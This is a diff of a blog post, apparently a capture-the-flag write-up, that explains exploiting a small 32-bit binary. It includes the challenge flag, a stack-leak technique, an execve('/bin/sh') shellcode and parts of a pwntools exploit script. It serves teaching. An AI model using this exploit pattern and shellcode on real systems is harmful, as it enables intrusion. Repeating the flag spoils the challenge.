@@ -106,7 +106,7 @@ int main() {
         <header class="post-header">
             <h1>Start</h1>
             
-            <p class="post-meta">Published: May 9, 2026</p>
+            <p class="post-meta">Published: May 10, 2026</p>
             
             
             <p style="color: var(--text-muted); margin-top: 5px; font-size: 0.9rem;">Tags: </p>
@@ -116,13 +116,27 @@ int main() {
         <div class="post-content" id="post-content">
             <p><strong>Flag:</strong> <code class="language-plaintext highlighter-rouge">FLAG{Pwn4bl3_tW_1s_y0ur_st4rt}</code></p>
 
-<h2 id="approach-step-by-step">Approach (Step by Step)</h2>
+<h2 id="binary-analysis">Binary Analysis</h2>
 
-<ol>
-  <li>The challenge provides a binary named <code class="language-plaintext highlighter-rouge">start</code>. Running <code class="language-plaintext highlighter-rouge">file</code> and <code class="language-plaintext highlighter-rouge">checksec</code> on it reveals it’s a 32-bit statically linked executable with almost all binary protections disabled (No Canary, NX disabled, No PIE).</li>
-  <li>The binary is extremely small (564 bytes) and only contains <code class="language-plaintext highlighter-rouge">_start</code> and <code class="language-plaintext highlighter-rouge">_exit</code> routines.</li>
-  <li>Disassembling <code class="language-plaintext highlighter-rouge">_start</code> in <code class="language-plaintext highlighter-rouge">gdb</code>:</li>
-</ol>
+<p>First, we analyze the binary’s basic properties and protections using <code class="language-plaintext highlighter-rouge">file</code> and <code class="language-plaintext highlighter-rouge">checksec</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>file start
+start: ELF 32-bit LSB executable, Intel i386, version 1 <span class="o">(</span>SYSV<span class="o">)</span>, statically linked, not stripped
+
+<span class="nv">$ </span>checksec start
+    Arch:       i386-32-little
+    RELRO:      No RELRO
+    Stack:      No canary found
+    NX:         NX disabled
+    PIE:        No PIE <span class="o">(</span>0x8048000<span class="o">)</span>
+    Stripped:   No
+</code></pre></div></div>
+
+<p>The binary is a very small (564 bytes) 32-bit statically linked executable with almost all binary protections disabled. The lack of NX (No-eXecute) means we can execute shellcode placed on the stack. The lack of PIE and Stack Canary makes buffer overflows trivial to exploit.</p>
+
+<h2 id="static-analysis">Static Analysis</h2>
+
+<p>Disassembling <code class="language-plaintext highlighter-rouge">_start</code> in <code class="language-plaintext highlighter-rouge">gdb</code> reveals a minimal program containing only two routines: <code class="language-plaintext highlighter-rouge">_start</code> and <code class="language-plaintext highlighter-rouge">_exit</code>.</p>
 
 <div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">0</span><span class="nf">x8048060</span> <span class="o">&lt;</span><span class="nv">_start</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">push</span>   <span class="nb">esp</span>
 <span class="err">0</span><span class="nf">x8048061</span> <span class="o">&lt;</span><span class="nv">_start</span><span class="o">+</span><span class="mi">1</span><span class="o">&gt;</span><span class="p">:</span>  <span class="nv">push</span>   <span class="mh">0x804809d</span>      <span class="c1">; push address of _exit</span>
@@ -149,24 +163,61 @@ int main() {
 </code></pre></div></div>
 
 <ol>
-  <li>The program pushes the string <code class="language-plaintext highlighter-rouge">"Let's start the CTF:"</code> onto the stack (20 bytes), then calls <code class="language-plaintext highlighter-rouge">sys_write</code> to print it.</li>
-  <li>It then calls <code class="language-plaintext highlighter-rouge">sys_read</code> to read up to 60 bytes into the stack buffer.</li>
+  <li>The program pushes the string <code class="language-plaintext highlighter-rouge">"Let's start the CTF:"</code> onto the stack in chunks (20 bytes total).</li>
+  <li>It calls <code class="language-plaintext highlighter-rouge">sys_write</code> to print the string to <code class="language-plaintext highlighter-rouge">stdout</code>.</li>
+  <li>It calls <code class="language-plaintext highlighter-rouge">sys_read</code> to read up to 60 bytes into the stack buffer starting at <code class="language-plaintext highlighter-rouge">esp</code>.</li>
   <li>After reading, it adds <code class="language-plaintext highlighter-rouge">0x14</code> (20 bytes) to <code class="language-plaintext highlighter-rouge">esp</code>, effectively bypassing the string we printed, and executes <code class="language-plaintext highlighter-rouge">ret</code>. The address it returns to is the <code class="language-plaintext highlighter-rouge">_exit</code> address pushed at <code class="language-plaintext highlighter-rouge">0x8048061</code>.</li>
-  <li><strong>Vulnerability:</strong> Since we can read 60 bytes but the buffer is only 20 bytes away from the return address, we have a classic buffer overflow. We need <code class="language-plaintext highlighter-rouge">20</code> bytes of padding to reach the return address, leaving us <code class="language-plaintext highlighter-rouge">60 - 24 = 36</code> bytes for our shellcode.</li>
 </ol>
 
-<h3 id="stage-1-stack-leak">Stage 1: Stack Leak</h3>
-<p>Since ASLR is likely enabled on the remote server and the stack address changes, we cannot jump to our shellcode directly. We need a stack leak first.
-We can overwrite the return address with the address of the <code class="language-plaintext highlighter-rouge">sys_write</code> call within the binary itself (<code class="language-plaintext highlighter-rouge">0x08048087</code>).</p>
+<h2 id="the-vulnerability">The Vulnerability</h2>
 
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">payload</span>  <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">A</span><span class="sh">'</span> <span class="o">*</span> <span class="mi">20</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x08048087</span><span class="p">)</span>
+<p>Since we can read 60 bytes but the buffer is only 20 bytes away from the return address, we have a classic buffer overflow. We need <code class="language-plaintext highlighter-rouge">20</code> bytes of padding to overwrite the return address. This leaves us <code class="language-plaintext highlighter-rouge">60 - 24 = 36</code> bytes for our shellcode on the stack, which is plenty for a <code class="language-plaintext highlighter-rouge">/bin/sh</code> execve payload.</p>
+
+<h2 id="stack-analysis-esp-dynamics">Stack Analysis (ESP Dynamics)</h2>
+
+<p>By analyzing the stack in <code class="language-plaintext highlighter-rouge">gdb</code> during execution, we can see exactly how the stack shifts:</p>
+
+<ol>
+  <li><strong>Initial State:</strong> Upon entry to <code class="language-plaintext highlighter-rouge">_start</code>, the first instruction <code class="language-plaintext highlighter-rouge">push esp</code> pushes the original stack pointer to the stack. This saved pointer is crucial for our leak later.</li>
+  <li><strong>String Push:</strong> Pushing <code class="language-plaintext highlighter-rouge">"Let's start the CTF:"</code> moves <code class="language-plaintext highlighter-rouge">esp</code> down by 20 bytes (<code class="language-plaintext highlighter-rouge">0x14</code>).</li>
+  <li><strong>The Overflow:</strong> When <code class="language-plaintext highlighter-rouge">sys_read</code> occurs, it writes to <code class="language-plaintext highlighter-rouge">esp</code>. If we write 20 bytes of ‘A’s, we fill the space meant for the string. The next 4 bytes we write will overwrite the return address (<code class="language-plaintext highlighter-rouge">_exit</code> pushed at <code class="language-plaintext highlighter-rouge">_start+1</code>).</li>
+  <li><strong>The Pivot:</strong> After <code class="language-plaintext highlighter-rouge">sys_read</code>, the program executes <code class="language-plaintext highlighter-rouge">add esp, 0x14</code> effectively removing the string from the stack, and then hits <code class="language-plaintext highlighter-rouge">ret</code>. The <code class="language-plaintext highlighter-rouge">ret</code> instruction pops the overridden return address into <code class="language-plaintext highlighter-rouge">EIP</code>.</li>
+</ol>
+
+<h2 id="exploitation">Exploitation</h2>
+
+<h3 id="stage-1-stack-leak">Stage 1: Stack Leak</h3>
+<p>Since ASLR is likely enabled on the remote server and the stack address changes, we cannot jump to our shellcode directly. We need a stack leak first.</p>
+
+<p>We can overwrite the return address with the address of the <code class="language-plaintext highlighter-rouge">sys_write</code> call within the binary itself (<code class="language-plaintext highlighter-rouge">0x08048087</code>), creating a small ROP chain.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">leak_gadget</span> <span class="o">=</span> <span class="mh">0x08048087</span>
+<span class="n">payload</span>  <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">A</span><span class="sh">'</span> <span class="o">*</span> <span class="mi">20</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="nf">p32</span><span class="p">(</span><span class="n">leak_gadget</span><span class="p">)</span>
 </code></pre></div></div>
-<p>When <code class="language-plaintext highlighter-rouge">ret</code> is executed, it jumps back to <code class="language-plaintext highlighter-rouge">mov ecx, esp</code>, but <code class="language-plaintext highlighter-rouge">esp</code> now points further down the stack to a saved stack pointer. The <code class="language-plaintext highlighter-rouge">write</code> syscall will leak 20 bytes from the stack including this stack address, and then the program will execute <code class="language-plaintext highlighter-rouge">sys_read</code> again, waiting for a second payload!</p>
+
+<p>When <code class="language-plaintext highlighter-rouge">ret</code> is executed, it jumps back to <code class="language-plaintext highlighter-rouge">mov ecx, esp</code>. Because <code class="language-plaintext highlighter-rouge">ret</code> popped the return address off the stack, <code class="language-plaintext highlighter-rouge">esp</code> now points to the original saved stack pointer (which was pushed at <code class="language-plaintext highlighter-rouge">0x8048060</code> with <code class="language-plaintext highlighter-rouge">push esp</code>). The <code class="language-plaintext highlighter-rouge">write</code> syscall will leak 20 bytes from the stack including this stack address, and then the program will execute <code class="language-plaintext highlighter-rouge">sys_read</code> again, waiting for a second payload!</p>
 
 <h3 id="stage-2-shellcode-execution">Stage 2: Shellcode Execution</h3>
-<p>By receiving the first 4 bytes from the leak, we can calculate the exact address where our shellcode will be stored (<code class="language-plaintext highlighter-rouge">esp + 20</code>).
-We can then send a second payload that overwrites the return address with the address of our shellcode, followed by the shellcode itself.</p>
+
+<p>From the leaked 20 bytes, the first 4 bytes are our leaked stack pointer. Because <code class="language-plaintext highlighter-rouge">sys_read</code> will be called again with this leaked <code class="language-plaintext highlighter-rouge">esp</code> as the buffer, we can calculate exactly where our shellcode will land.</p>
+
+<p>We overwrite the return address again, this time pointing it to <code class="language-plaintext highlighter-rouge">esp + 0x14</code> (which is right after the return address itself), followed by our shellcode.</p>
+
+<h4 id="shellcode-breakdown">Shellcode Breakdown</h4>
+<p>The 25-byte shellcode used executes <code class="language-plaintext highlighter-rouge">execve("/bin/sh", NULL, NULL)</code>. It is built as follows:</p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>       <span class="c1">; Clear eax</span>
+<span class="nf">push</span> <span class="nb">eax</span>           <span class="c1">; Null terminator for string</span>
+<span class="nf">push</span> <span class="mh">0x68732f2f</span>    <span class="c1">; "hs//"</span>
+<span class="nf">push</span> <span class="mh">0x6e69622f</span>    <span class="c1">; "nib/"</span>
+<span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">esp</span>       <span class="c1">; ebx = pointer to "/bin//sh"</span>
+<span class="nf">push</span> <span class="nb">eax</span>           <span class="c1">; Push NULL</span>
+<span class="nf">push</span> <span class="nb">ebx</span>           <span class="c1">; Push pointer to "/bin//sh"</span>
+<span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">esp</span>       <span class="c1">; ecx = pointer to array [pointer to string, NULL]</span>
+<span class="nf">xor</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">edx</span>       <span class="c1">; edx = NULL</span>
+<span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mh">0xb</span>        <span class="c1">; syscall number for execve (11)</span>
+<span class="nf">int</span> <span class="mh">0x80</span>           <span class="c1">; Execute syscall</span>
+</code></pre></div></div>
 
 <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">shellcode_addr</span> <span class="o">=</span> <span class="n">esp</span> <span class="o">+</span> <span class="mh">0x14</span>
 <span class="n">payload</span>  <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">A</span><span class="sh">'</span> <span class="o">*</span> <span class="mi">20</span>
@@ -174,7 +225,7 @@ We can then send a second payload that overwrites the return address with the ad
 <span class="n">payload</span> <span class="o">+=</span> <span class="n">shellcode</span>
 </code></pre></div></div>
 
-<h3 id="exploit-script">Exploit Script</h3>
+<h3 id="final-exploit-script">Final Exploit Script</h3>
 
 <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
@@ -206,7 +257,7 @@ We can then send a second payload that overwrites the return address with the ad
 
 <span class="n">log</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">Leaked ESP: </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">esp</span><span class="p">)</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
 
-<span class="c1"># Shellcode will be after RET
+<span class="c1"># Shellcode will be located right after the RET address
 </span><span class="n">shellcode_addr</span> <span class="o">=</span> <span class="n">esp</span> <span class="o">+</span> <span class="mh">0x14</span>
 <span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">Shellcode addr: </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">shellcode_addr</span><span class="p">)</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
 
